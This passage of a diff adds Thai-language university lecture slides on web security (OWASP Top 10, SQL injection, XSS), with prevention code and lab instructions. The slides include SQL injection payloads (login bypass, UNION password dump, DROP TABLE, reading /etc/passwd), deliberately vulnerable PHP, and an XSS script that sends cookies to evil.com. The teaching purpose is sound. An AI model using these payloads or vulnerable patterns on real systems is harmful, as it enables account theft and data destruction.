+                <h1>💥 SQL Injection - ตัวอย่างการโจมตี</h1>
+                <h3>🎭 Scenario: Login Bypass</h3>
+                <div class="grid-2">
+                    <div>
+                        <h4>Normal Login</h4>
+                        <div class="code-block">Username: john
+Password: secret123
+
+Query:
+SELECT * FROM users 
+WHERE username = 'john' 
+AND password = 'secret123'</div>
+                        <div class="success-box">
+                            <p>✅ ทำงานปกติ - Login สำเร็จถ้าข้อมูลถูกต้อง</p>
+                        </div>
+                    </div>
+                    <div>
+                        <h4>Malicious Login</h4>
+                        <div class="code-block" style="background: #ff6b6b; color: white;">Username: admin'--
+Password: anything
+
+Query:
+SELECT * FROM users 
+WHERE username = 'admin'--' 
+AND password = 'anything'</div>
+                        <div class="warning-box">
+                            <p>💀 <strong>-- คือ Comment ใน SQL!</strong></p>
+                            <p>ส่วน password ถูก comment ทิ้ง</p>
+                            <p>➡️ Login ได้โดยไม่ต้องรู้รหัสผ่าน!</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 16: SQL Injection - More Attacks -->
+            <div class="slide">
+                <h1>💣 SQL Injection - ตัวอย่างเพิ่มเติม</h1>
+                <h3>🔍 1. ดึงข้อมูลทั้งหมด (UNION-based)</h3>
+                <div class="code-block">Input: ' UNION SELECT username, password FROM users--
+
+Result:
+แสดงข้อมูล username และ password ของทุกคนใน Database!</div>
+                
+                <h3 style="margin-top: 30px;">💀 2. ลบข้อมูล (Destructive)</h3>
+                <div class="code-block" style="background: #c0392b; color: white;">Input: '; DROP TABLE users;--
+
+Result:
+ลบตาราง users ทั้งหมด!</div>
+                
+                <h3 style="margin-top: 30px;">🔓 3. อ่านไฟล์ระบบ</h3>
+                <div class="code-block">Input: ' UNION SELECT LOAD_FILE('/etc/passwd')--
+
+Result:
+อ่านไฟล์ระบบ (ถ้า Database มีสิทธิ์)</div>
+                
+                <div class="warning-box" style="margin-top: 30px;">
+                    <h3>⚠️ คำเตือน</h3>
+                    <p>อย่าลองทำ SQL Injection บนระบบจริงหรือระบบที่คุณไม่ได้รับอนุญาต - เป็นความผิดทางกฎหมาย!</p>
+                </div>
+            </div>
+
+            <!-- Slide 17: SQL Injection - Prevention -->
+            <div class="slide">
+                <h1>🛡️ SQL Injection - วิธีป้องกัน</h1>
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>✅ #1 Prepared Statements (Best Practice)</h3>
+                        <div class="code-block" style="font-size: 0.9em;">// ✅ Secure Code
+$stmt = $conn->prepare(
+  "SELECT * FROM users 
+   WHERE username = ? 
+   AND password = ?"
+);
+$stmt->bind_param("ss", 
+  $username, $password);
+$stmt->execute();</div>
+                    </div>
+                    <div class="card">
+                        <h3>✅ #2 ORM (Object-Relational Mapping)</h3>
+                        <div class="code-block" style="font-size: 0.9em;">// ✅ Using ORM (Laravel)
+$user = User::where(
+  'username', $username
+)->where(
+  'password', $password
+)->first();</div>
+                    </div>
+                </div>
+                <div class="success-box" style="margin-top: 30px;">
+                    <h3>🎯 หลักการสำคัญ</h3>
+                    <ul class="icon-list">
+                        <li><strong>ไม่ใช้ String Concatenation</strong> ในการสร้าง SQL Query</li>
+                        <li><strong>ใช้ Parameterized Query</strong> หรือ Prepared Statements เสมอ</li>
+                        <li><strong>Validate Input</strong> ตรวจสอบชนิดและรูปแบบข้อมูล</li>
+                        <li><strong>ใช้ ORM</strong> ถ้าเป็นไปได้</li>
+                        <li><strong>Principle of Least Privilege</strong> ให้สิทธิ์ Database น้อยที่สุดที่จำเป็น</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Slide 18: Input Validation -->
+            <div class="slide">
+                <h1>✔️ Input Validation</h1>
+                <div class="info-box">
+                    <h2>🎯 กฎทอง: Never Trust User Input</h2>
+                    <p style="font-size: 1.2em;">ตรวจสอบและทำความสะอาดข้อมูลที่มาจากผู้ใช้ <strong>ทุกครั้ง!</strong></p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div>
+                        <h3>✅ Whitelist Approach (แนะนำ)</h3>
+                        <div class="code-block" style="font-size: 0.9em;">// อนุญาตเฉพาะที่ต้องการ
+if (preg_match('/^[a-zA-Z0-9_]+$/', 
+    $username)) {
+    // ✅ OK: เฉพาะตัวอักษร
+    //    ตัวเลข และ underscore
+} else {
+    // ❌ Reject
+}</div>
+                        <div class="success-box">
+                            <p><strong>✅ ปลอดภัยกว่า:</strong> อนุญาตเฉพาะที่คาดหวัง</p>
+                        </div>
+                    </div>
+                    <div>
+                        <h3>⚠️ Blacklist Approach (ไม่แนะนำ)</h3>
+                        <div class="code-block" style="font-size: 0.9em;">// บล็อกเฉพาะที่รู้ว่าอันตราย
+$blacklist = ["'", '"', "--"];
+$clean = str_replace(
+    $blacklist, '', $username);
+// ❌ Problem: มีวิธีหลบหลีก
+//    ได้ง่าย</div>
+                        <div class="warning-box">
+                            <p><strong>⚠️ มีจุดอ่อน:</strong> เลี่ยงได้หลายวิธี</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="quote-box" style="margin-top: 30px;">
+                    <strong>💡 Best Practice:</strong> ใช้ Whitelist + Prepared Statements ร่วมกัน = ความปลอดภัยสูงสุด
+                </div>
+            </div>
+
+            <!-- Slide 19: Cross-Site Scripting (XSS) -->
+            <div class="slide">
+                <h1>🎭 Part 4: Cross-Site Scripting (XSS)</h1>
+                <h2>4.1 XSS คืออะไร?</h2>
+                <div class="warning-box">
+                    <p style="font-size: 1.2em;">การแทรก JavaScript หรือ HTML ที่เป็นอันตรายเข้าไปในเว็บไซต์ เพื่อโจมตีผู้ใช้คนอื่นที่เข้ามาเยี่ยมชม</p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div>
+                        <h3>🎯 เป้าหมายของ Attacker</h3>
+                        <ul class="icon-list">
+                            <li>ขโมย Cookie และ Session Token</li>
+                            <li>เปลี่ยนหน้าเว็บ (Defacement)</li>
+                            <li>Redirect ไปเว็บ Phishing</li>
+                            <li>ขโมยข้อมูลส่วนตัว</li>
+                            <li>กระจายมัลแวร์</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3>⚠️ ความแตกต่างจาก SQLi</h3>
+                        <table style="font-size: 0.9em;">
+                            <tr>
+                                <th>SQL Injection</th>
+                                <th>XSS</th>
+                            </tr>
+                            <tr>
+                                <td>โจมตีฝั่ง Server</td>
+                                <td>โจมตีฝั่ง Client</td>
+                            </tr>
+                            <tr>
+                                <td>แทรกคำสั่ง SQL</td>
+                                <td>แทรก JavaScript</td>
+                            </tr>
+                            <tr>
+                                <td>เป้าหมาย: Database</td>
+                                <td>เป้าหมาย: Users</td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 20: XSS Types -->
+            <div class="slide">
+                <h1>📋 XSS - ประเภทหลัก</h1>
+                <div class="grid-3">
+                    <div class="card">
+                        <h3>1. Stored XSS</h3>
+                        <span class="badge badge-danger">อันตรายสูงสุด</span>
+                        <p style="margin-top: 15px;">โค้ดถูกบันทึกใน Database</p>
+                        <p>ทุกคนที่เข้ามาดูจะถูกโจมตี</p>
+                        <p><strong>ตัวอย่าง:</strong> Comment, Forum, Profile</p>
+                    </div>
+                    <div class="card">
+                        <h3>2. Reflected XSS</h3>
+                        <span class="badge badge-warning">อันตรายปานกลาง</span>
+                        <p style="margin-top: 15px;">โค้ดอยู่ใน URL หรือ Form</p>
+                        <p>โจมตีเฉพาะคนที่คลิกลิงก์</p>
+                        <p><strong>ตัวอย่าง:</strong> Search, Error Message</p>
+                    </div>
+                    <div class="card">
+                        <h3>3. DOM-based XSS</h3>
+                        <span class="badge badge-warning">อันตราย</span>
+                        <p style="margin-top: 15px;">โค้ดทำงานฝั่ง Client</p>
+                        <p>ไม่ส่งไปที่ Server</p>
+                        <p><strong>ตัวอย่าง:</strong> Client-side JavaScript</p>
+                    </div>
+                </div>
+                <div class="info-box" style="margin-top: 30px;">
+                    <h3>📊 สถิติ</h3>
+                    <p><strong>70%</strong> ของเว็บแอปพลิเคชันมีช่องโหว่ XSS</p>
+                    <p><strong>Stored XSS</strong> เป็นอันตรายที่สุดเพราะโจมตีได้หลายคนพร้อมกัน</p>
+                </div>
+            </div>
+
+            <!-- Slide 21: XSS Example - Stored -->
+            <div class="slide">
+                <h1>💥 XSS - ตัวอย่าง Stored XSS</h1>
+                <h3>🎭 Scenario: Comment Section</h3>
+                <div class="grid-2">
+                    <div>
+                        <h4>Vulnerable Code</h4>
+                        <div class="code-block">// ❌ Insecure
+&lt;?php
+$comment = $_POST['comment'];
+
+// บันทึกลง Database
+saveComment($comment);
+
+// แสดงผล
+echo $comment;
+?&gt;</div>
+                    </div>
+                    <div>
+                        <h4>Attack Payload</h4>
+                        <div class="code-block" style="background: #ff6b6b; color: white;">&lt;script&gt;
+// ขโมย Cookie
+var cookie = document.cookie;
+fetch('http://evil.com/steal.php?c='
+      + cookie);
+&lt;/script&gt;</div>
+                    </div>
+                </div>
+                <div class="warning-box" style="margin-top: 30px;">
+                    <h3>💀 ผลกระทบ</h3>
+                    <ul>
+                        <li>Script ถูกบันทึกลง Database</li>
+                        <li>ทุกคนที่เข้ามาอ่าน Comment จะถูกโจมตี</li>
+                        <li>Cookie และ Session Token ถูกขโมย</li>
+                        <li>Attacker สามารถ Login เป็นเหยื่อได้</li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Slide 22: XSS Example - Reflected -->
+            <div class="slide">
+                <h1>💥 XSS - ตัวอย่าง Reflected XSS</h1>
+                <h3>🔍 Scenario: Search Function</h3>
+                <div class="grid-2">
+                    <div>
+                        <h4>Vulnerable Code</h4>
+                        <div class="code-block">// ❌ Insecure
+&lt;?php
+$search = $_GET['q'];
+echo "ผลการค้นหา: " . $search;
+?&gt;</div>
+                        <h4>Normal Request</h4>
+                        <div class="code-block">GET /search?q=laptop
+
+Output:
+ผลการค้นหา: laptop</div>
+                    </div>
+                    <div>
+                        <h4>Malicious Request</h4>
+                        <div class="code-block" style="background: #ff6b6b; color: white;">GET /search?q=&lt;script&gt;
+alert(document.cookie)
+&lt;/script&gt;
+
+Output:
+ผลการค้นหา: &lt;script&gt;
+alert(document.cookie)
+&lt;/script&gt;</div>
+                        <div class="warning-box" style="margin-top: 15px;">
+                            <p><strong>⚠️ การโจมตี:</strong></p>
+                            <p>Attacker ส่งลิงก์ให้เหยื่อคลิก</p>
+                            <p>เมื่อคลิก JavaScript จะทำงาน</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 23: XSS Prevention -->
+            <div class="slide">
+                <h1>🛡️ XSS - วิธีป้องกัน</h1>
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>✅ #1 Output Encoding (สำคัญที่สุด)</h3>
+                        <div class="code-block" style="font-size: 0.85em;">// ✅ PHP
+echo htmlspecialchars(
+  $comment, 
+  ENT_QUOTES, 
+  'UTF-8'
+);
+
+// ✅ JavaScript
+element.textContent = userInput;
+// NOT: element.innerHTML</div>
+                    </div>
+                    <div class="card">
+                        <h3>✅ #2 Content Security Policy (CSP)</h3>
+                        <div class="code-block" style="font-size: 0.85em;">// HTTP Header
+Content-Security-Policy: 
+  default-src 'self'; 
+  script-src 'self' 
+  https://trusted.com;</div>
+                    </div>
+                </div>
+                <div class="grid-2" style="margin-top: 20px;">
+                    <div class="card">
+                        <h3>✅ #3 HTTPOnly Cookies</h3>
+                        <div class="code-block" style="font-size: 0.85em;">setcookie(
+  "session", 
+  $token,
+  [
+    'httponly' => true,
+    'secure' => true
+  ]
+);</div>
+                    </div>
+                    <div class="card">
+                        <h3>✅ #4 Input Validation</h3>
+                        <div class="code-block" style="font-size: 0.85em;">// Sanitize HTML
+$clean = strip_tags(
+  $input, 
+  '&lt;p&gt;&lt;b&gt;&lt;i&gt;'
+);</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 24: Output Encoding Details -->
+            <div class="slide">
+                <h1>🔤 Output Encoding - รายละเอียด</h1>
+                <h3>🎯 แนวคิด: แปลงอักขระพิเศษให้เป็นเพียง "ข้อความ"</h3>
+                <table style="margin: 30px 0;">
+                    <thead>
+                        <tr>
+                            <th>Character</th>
+                            <th>Encoded As</th>
+                            <th>ผลลัพธ์</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>&lt;</td>
+                            <td>&amp;lt;</td>
+                            <td>แสดงเป็นตัวอักษร &lt; ไม่ใช่ HTML Tag</td>
+                        </tr>
+                        <tr>
+                            <td>&gt;</td>
+                            <td>&amp;gt;</td>
+                            <td>แสดงเป็นตัวอักษร &gt;</td>
+                        </tr>
+                        <tr>
+                            <td>"</td>
+                            <td>&amp;quot;</td>
+                            <td>ป้องกัน Attribute Injection</td>
+                        </tr>
+                        <tr>
+                            <td>'</td>
+                            <td>&amp;#x27;</td>
+                            <td>ป้องกัน Attribute Injection</td>
+                        </tr>
+                        <tr>
+                            <td>&amp;</td>
+                            <td>&amp;amp;</td>
+                            <td>ป้องกัน Entity Injection</td>
+                        </tr>
+                    </tbody>
+                </table>
+                <div class="success-box">
+                    <h3>✅ ตัวอย่างการทำงาน</h3>
+                    <div class="code-block">Input:  &lt;script&gt;alert('XSS')&lt;/script&gt;
+After:  &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;
+Result: แสดงเป็นข้อความธรรมดา ไม่รัน JavaScript</div>
+                </div>
+            </div>
+
+            <!-- Slide 25: Content Security Policy -->
+            <div class="slide">
+                <h1>🛡️ Content Security Policy (CSP)</h1>
+                <div class="info-box">
+                    <h2>CSP คืออะไร?</h2>
+                    <p>HTTP Header ที่บอกเบราว์เซอร์ว่าอนุญาตให้โหลด Resource จากที่ไหนได้บ้าง</p>
+                </div>
+                <h3 style="margin-top: 30px;">📝 ตัวอย่าง CSP Headers</h3>
+                <div class="code-block">// Basic CSP - อนุญาตเฉพาะจาก same origin
+Content-Security-Policy: default-src 'self';
+
+// อนุญาต Script จาก CDN ที่เชื่อถือได้
+Content-Security-Policy: 
+  default-src 'self'; 
+  script-src 'self' https://cdn.jsdelivr.net;
+
+// Block inline JavaScript ทั้งหมด
+Content-Security-Policy: 
+  script-src 'self'; 
+  object-src 'none';</div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="success-box">
+                        <h3>✅ ข้อดี</h3>
+                        <ul>
+                            <li>ป้องกัน Inline Script</li>
+                            <li>ควบคุม Resource Loading</li>
+                            <li>ตรวจจับการโจมตี</li>
+                        </ul>
+                    </div>
+                    <div class="warning-box">
+                        <h3>⚠️ ข้อควรระวัง</h3>
+                        <ul>
+                            <li>ต้องทดสอบก่อนใช้งานจริง</li>
+                            <li>อาจ Break ฟีเจอร์บาง</li>
+                            <li>ใช้ Report-Only Mode ตอนแรก</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 26: Secure Coding Principles -->
+            <div class="slide">
+                <h1>💻 Part 5: Secure Coding Principles</h1>
+                <div class="grid-2">
+                    <div class="info-box">
+                        <h3>1️⃣ Never Trust User Input</h3>
+                        <p>ตรวจสอบและทำความสะอาดข้อมูลทุกครั้ง</p>
+                    </div>
+                    <div class="info-box">
+                        <h3>2️⃣ Defense in Depth</h3>
+                        <p>ใช้การป้องกันหลายชั้น ไม่พึ่งวิธีเดียว</p>
+                    </div>
+                    <div class="info-box">
+                        <h3>3️⃣ Principle of Least Privilege</h3>
+                        <p>ให้สิทธิ์น้อยที่สุดที่จำเป็น</p>
+                    </div>
+                    <div class="info-box">
+                        <h3>4️⃣ Fail Securely</h3>
+                        <p>เมื่อ Error ต้องปลอดภัย ไม่รั่วไหลข้อมูล</p>
+                    </div>
+                    <div class="info-box">
+                        <h3>5️⃣ Keep Security Simple</h3>
+                        <p>ระบบซับซ้อนมีช่องโหว่ง่ายกว่า</p>
+                    </div>
+                    <div class="info-box">
+                        <h3>6️⃣ Don't Rely on Security by Obscurity</h3>
+                        <p>อย่าพึ่งการซ่อนเป็นความปลอดภัย</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 27: Secure Coding Checklist -->
+            <div class="slide">
+                <h1>✅ Secure Coding Checklist</h1>
+                <div class="grid-2">
+                    <div>
+                        <h3>🔐 Authentication & Authorization</h3>
+                        <ul class="icon-list">
+                            <li>ใช้ Strong Password Policy</li>
+                            <li>Implement MFA เมื่อเป็นไปได้</li>
+                            <li>Session Management ที่ปลอดภัย</li>
+                            <li>Logout ให้ชัดเจน</li>
+                            <li>ตรวจสอบสิทธิ์ทุก Request</li>
+                        </ul>
+                        <h3 style="margin-top: 30px;">💾 Data Protection</h3>
+                        <ul class="icon-list">
+                            <li>Encrypt Sensitive Data</li>
+                            <li>Hash Passwords (bcrypt, Argon2)</li>
+                            <li>Use HTTPS เสมอ</li>
+                            <li>Secure Cookie Settings</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3>📝 Input/Output</h3>
+                        <ul class="icon-list">
+                            <li>Validate All Inputs</li>
+                            <li>Sanitize/Encode Outputs</li>
+                            <li>Use Prepared Statements</li>
+                            <li>Implement CSP</li>
+                            <li>Rate Limiting</li>
+                        </ul>
+                        <h3 style="margin-top: 30px;">🔧 Configuration</h3>
+                        <ul class="icon-list">
+                            <li>ปิด Debug Mode ใน Production</li>
+                            <li>Remove Default Credentials</li>
+                            <li>Update Dependencies เป็นประจำ</li>
+                            <li>Secure Error Handling</li>
+                            <li>Implement Logging</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 28: Real-World Case Study -->
+            <div class="slide">
+                <h1>📰 Part 6: Case Studies</h1>
+                <h2>🏦 Case 1: Equifax Data Breach (2017)</h2>
+                <div class="warning-box">
+                    <h3>💀 สถานการณ์</h3>
+                    <p>ข้อมูลส่วนตัวของ <strong>147 ล้านคน</strong> รั่วไหล รวมถึง SSN, วันเกิด, ที่อยู่, หมายเลขใบขับขี่</p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="card">
+                        <h3>⚠️ สาเหตุ</h3>
+                        <ul>
+                            <li>ช่องโหว่ใน Apache Struts framework (CVE-2017-5638)</li>
+                            <li>ไม่ได้ Patch ทันเวลา</li>
+                            <li>Vulnerable Component (OWASP #8)</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>💥 ผลกระทบ</h3>
+                        <ul>
+                            <li>ค่าปรับ <strong>$700 ล้าน</strong></li>
+                            <li>CEO ลาออก</li>
+                            <li>ความเสียหายต่อชื่อเสียง</li>
+                            <li>คดีความนับร้อย</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="quote-box" style="margin-top: 20px;">
+                    <strong>💡 บทเรียน:</strong> การ Update และ Patch ระบบทันเวลาสำคัญมาก!
+                </div>
+            </div>
+
+            <!-- Slide 29: Case Study 2 -->
+            <div class="slide">
+                <h1>📰 Case 2: British Airways (2018)</h1>
+                <div class="warning-box">
+                    <h3>💀 สถานการณ์</h3>
+                    <p>ข้อมูลบัตรเครดิตของลูกค้า <strong>380,000 คน</strong> ถูกขโมยผ่านเว็บไซต์และแอป</p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="card">
+                        <h3>⚠️ สาเหตุ</h3>
+                        <ul>
+                            <li>XSS Attack บนหน้า Payment</li>
+                            <li>JavaScript ที่เป็นอันตรายถูกแทรก</li>
+                            <li>ไม่มี CSP Header</li>
+                            <li>ไม่มี Subresource Integrity Check</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>💥 ผลกระทบ</h3>
+                        <ul>
+                            <li>ค่าปรับตาม GDPR: <strong>£183 ล้าน</strong></li>
+                            <li>ความเชื่อมั่นของลูกค้าลดลง</li>
+                            <li>ต้องชดเชยลูกค้าที่ได้รับผลกระทบ</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="quote-box" style="margin-top: 20px;">
+                    <strong>💡 บทเรียน:</strong> XSS อาจดูไม่ร้ายแรง แต่ผลกระทบสามารถมหาศาลได้!
+                </div>
+            </div>
+
+            <!-- Slide 30: Lab Exercise Overview -->
+            <div class="slide">
+                <h1>🧪 Part 7: Lab Exercise</h1>
+                <h2>Lab 3: Web Security Hands-on</h2>
+                <div class="info-box">
+                    <h3>🎯 วัตถุประสงค์</h3>
+                    <p>ทดลองการโจมตีและการป้องกัน SQL Injection และ XSS ในสภาพแวดล้อมที่ปลอดภัย</p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="card">
+                        <h3>📋 Part 1: SQL Injection</h3>
+                        <ul>
+                            <li>ทดลองโจมตี Login Bypass</li>
+                            <li>ดึงข้อมูลด้วย UNION SELECT</li>
+                            <li>แก้ไขโค้ดให้ใช้ Prepared Statement</li>
+                            <li>ทดสอบว่าแก้ไขแล้วถูกโจมตีไม่ได้</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>📋 Part 2: XSS</h3>
+                        <ul>
+                            <li>ทดลองโจมตี Stored XSS</li>
+                            <li>ทดลอง Reflected XSS</li>
+                            <li>แก้ไขโค้ดให้ใช้ Output Encoding</li>
+                            <li>ทดสอบการใช้งาน CSP</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="warning-box" style="margin-top: 30px;">
+                    <h3>⚠️ สิ่งที่ต้องส่ง</h3>
+                    <ul>
+                        <li>รายงาน Lab (PDF) พร้อม Screenshots</li>
+                        <li>Source Code ที่แก้ไขแล้ว</li>
+                        <li>คำอธิบายวิธีการป้องกัน</li>
+                        <li>กำหนดส่ง: <strong>1 สัปดาห์</strong></li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Slide 31: Lab Tools -->
+            <div class="slide">
+                <h1>🛠️ เครื่องมือที่ใช้ใน Lab</h1>
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>🧃 OWASP Juice Shop</h3>
+                        <p>เว็บแอปพลิเคชันที่มีช่องโหว่สำหรับฝึกหัด</p>
+                        <div class="code-block" style="font-size: 0.85em; margin-top: 15px;"># Installation
+docker pull bkimminich/juice-shop
+docker run -p 3000:3000 \
+  bkimminich/juice-shop</div>
+                        <span class="badge badge-success">แนะนำ</span>
+                    </div>
+                    <div class="card">
+                        <h3>💻 DVWA</h3>
+                        <p>Damn Vulnerable Web Application</p>
+                        <div class="code-block" style="font-size: 0.85em; margin-top: 15px;"># Installation
+docker pull vulnerables/web-dvwa
+docker run -p 80:80 \
+  vulnerables/web-dvwa</div>
+                        <span class="badge badge-info">ทางเลือก</span>
+                    </div>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="card">
+                        <h3>🔍 Burp Suite Community</h3>
+                        <p>เครื่องมือสำหรับดัก HTTP Request/Response</p>
+                        <p><strong>Download:</strong> portswigger.net/burp</p>
+                    </div>
+                    <div class="card">
+                        <h3>🦊 OWASP ZAP</h3>
+                        <p>Security Scanner แบบ Open Source</p>
+                        <p><strong>Download:</strong> zaproxy.org</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 32: Beyond Injection -->
+            <div class="slide">
+                <h1>🌟 Part 8: Beyond Injection</h1>
+                <h2>OWASP Top 10 ช่องโหว่อื่นๆ</h2>
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>🔓 #1 Broken Access Control</h3>
+                        <p><strong>ตัวอย่าง:</strong> เปลี่ยน URL จาก /user/123 เป็น /user/456 เพื่อดูข้อมูลคนอื่น</p>
+                        <p><strong>การป้องกัน:</strong> ตรวจสอบสิทธิ์ทุก Request</p>
+                    </div>
+                    <div class="card">
+                        <h3>⚙️ #2 Security Misconfiguration</h3>
+                        <p><strong>ตัวอย่าง:</strong> Debug Mode เปิดใน Production, Default Password</p>
+                        <p><strong>การป้องกัน:</strong> Security Hardening Checklist</p>
+                    </div>
+                    <div class="card">
+                        <h3>📦 #3 Supply Chain Failures</h3>
+                        <p><strong>ตัวอย่าง:</strong> Log4Shell, SolarWinds</p>
+                        <p><strong>การป้องกัน:</strong> ตรวจสอบ Dependencies เป็นประจำ</p>
+                    </div>
+                    <div class="card">
+                        <h3>🔑 #7 Authentication Failures</h3>
+                        <p><strong>ตัวอย่าง:</strong> Weak Password, Session Fixation</p>
+                        <p><strong>การป้องกัน:</strong> MFA, Secure Session Management</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 33: Discussion Questions -->
+            <div class="slide">
+                <h1>💭 คำถามชวนคิด & อภิปราย</h1>
+                <div class="info-box">
+                    <h3>1️⃣ Balance Security vs Usability</h3>
+                    <p>การทำให้ระบบปลอดภัยมากขึ้น อาจทำให้ใช้งานยากขึ้น (เช่น Password ที่ซับซ้อนมาก)</p>
+                    <p><strong>คำถาม:</strong> จะหาจุดสมดุลได้อย่างไร?</p>
+                </div>
+                <div class="info-box">
+                    <h3>2️⃣ Legacy Code</h3>
+                    <p>โค้ดเก่าที่เขียนมานาน อาจมีช่องโหว่มากมาย แต่ Refactor ใหม่ทั้งหมดก็ใช้เวลานาน</p>
+                    <p><strong>คำถาม:</strong> ถ้าคุณเป็น Tech Lead จะแก้ไขอย่างไร?</p>
+                </div>
+                <div class="info-box">
+                    <h3>3️⃣ Security Awareness</h3>
+                    <p>นักพัฒนาหลายคนยังไม่ตระหนักถึงความสำคัญของ Secure Coding</p>
+                    <p><strong>คำถาม:</strong> จะสร้าง Security Culture ในทีมได้อย่างไร?</p>
+                </div>
+            </div>
+
+            <!-- Slide 34: Key Takeaways -->
+            <div class="slide">
+                <h1>🎯 Part 9: Key Takeaways</h1>
+                <div class="grid-2">
+                    <div class="success-box">
+                        <h3>1️⃣ OWASP Top 10 คือมาตรฐาน</h3>
+                        <p>ใช้เป็น Baseline ในการพัฒนาซอฟต์แวร์ปลอดภัย</p>
+                    </div>
+                    <div class="success-box">
+                        <h3>2️⃣ Injection ยังเป็นภัยคุกคามสำคัญ</h3>
+                        <p>ใช้ Parameterized Query ทุกครั้ง!</p>
+                    </div>
+                    <div class="success-box">
+                        <h3>3️⃣ XSS ป้องกันได้ง่าย</h3>
+                        <p>htmlspecialchars(), textContent, CSP</p>
+                    </div>
+                    <div class="success-box">
+                        <h3>4️⃣ Input Validation ใช้ Whitelist</h3>
+                        <p>ปลอดภัยกว่า Blacklist เสมอ</p>
+                    </div>
+                    <div class="success-box">
+                        <h3>5️⃣ Security ต้องคิดตั้งแต่ Design</h3>
+                        <p>Secure by Design, not by Patch</p>
+                    </div>
+                    <div class="success-box">
+                        <h3>6️⃣ Supply Chain Security สำคัญ</h3>
+                        <p>ตรวจสอบ Dependencies เป็นประจำ</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 35: Summary Infographic -->
+            <div class="slide">
+                <h1>📊 สรุป: Web Application Security</h1>
+                <div class="ascii-box" style="font-size: 1em;">┌─────────────────────────────────────────────────────┐
+│                                                     │
+│             🛡️ WEB APPLICATION SECURITY            │
+│                                                     │
+│  ┌───────────────────────────────────────────────┐ │
+│  │                                               │ │
+│  │    💉 SQL Injection      🎭 XSS               │ │
+│  │    ──────────────       ─────                 │ │
+│  │    Problem:             Problem:              │ │
+│  │    User input ใน SQL    User input ใน HTML    │ │
+│  │                                               │ │
+│  │    Solution:            Solution:             │ │
+│  │    ✅ Prepared          ✅ Output Encoding    │ │
+│  │       Statements                              │ │
+│  │    ✅ ORM               ✅ CSP Headers         │ │
+│  │    ✅ Input Validation  ✅ HTTPOnly Cookies   │ │
+│  │                                               │ │
+│  └───────────────────────────────────────────────┘ │
+│                                                     │
+│          ┌───────────────────────────┐             │
+│          │   🏆 OWASP Top 10:2025    │             │
+│          │                           │             │
+│          │  #1 Access Control        │             │
+│          │  #2 Misconfiguration      │             │
+│          │  #3 Supply Chain 🆕       │             │
+│          │  #4 Cryptographic         │             │
+│          │  #5 Injection ← วันนี้     │             │
+│          └───────────────────────────┘             │
+│                                                     │
+│   ╔════════════════════════════════════════════╗   │
+│   ║  💡 "Never Trust User Input"              ║   │
+│   ╚════════════════════════════════════════════╝   │
+│                                                     │
+└─────────────────────────────────────────────────────┘</div>
+            </div>
+
+            <!-- Slide 36: Next Week Preview -->
+            <div class="slide">
+                <h1>📅 Preview: Week 8</h1>
+                <div class="warning-box">
+                    <h2>📝 Midterm Examination</h2>
+                    <p style="font-size: 1.3em;">สัปดาห์หน้า: <strong>สอบกลางภาค</strong></p>
+                </div>
+                <div class="grid-2" style="margin-top: 30px;">
+                    <div class="card">
+                        <h3>📚 เนื้อหาที่ต้องทบทวน</h3>
+                        <ul>
+                            <li>Week 1: CIA Triad, Asset-Threat-Vulnerability</li>
+                            <li>Week 2: Malware Types, Social Engineering</li>
+                            <li>Week 3: CVE/CVSS, Risk Assessment</li>
+                            <li>Week 4: OS Security, AAA, Hardening</li>
+                            <li>Week 5: Network Security, Firewall, IDS/IPS</li>
+                            <li>Week 6: Cryptography, Symmetric vs Asymmetric</li>
+                            <li>Week 7: OWASP Top 10, SQLi, XSS ← วันนี้</li>
+                        </ul>
+                    </div>
+                    <div class="card">
+                        <h3>💡 Tips การเตรียมตัว</h3>
+                        <ul class="icon-list">
+                            <li>ทบทวน Case Studies ที่เรียนมา</li>
+                            <li>เข้าใจ Concept มากกว่าท่องจำ</li>
+                            <li>ฝึกเขียนอธิบายการป้องกันช่องโหว่</li>
+                            <li>ทำแบบฝึกหัดที่ให้ไว้ใน Lab</li>
+                            <li>ศึกษา Real-world Examples</li>
+                        </ul>
+                        <div class="info-box" style="margin-top: 20px;">
+                            <p>📅 <strong>Review Session:</strong> จะมีในสัปดาห์หน้าก่อนสอบ</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Slide 37: Resources -->
+            <div class="slide">
+                <h1>📚 แหล่งเรียนรู้เพิ่มเติม</h1>
+                <div class="grid-2">
+                    <div class="card">
+                        <h3>🌐 Official Resources</h3>
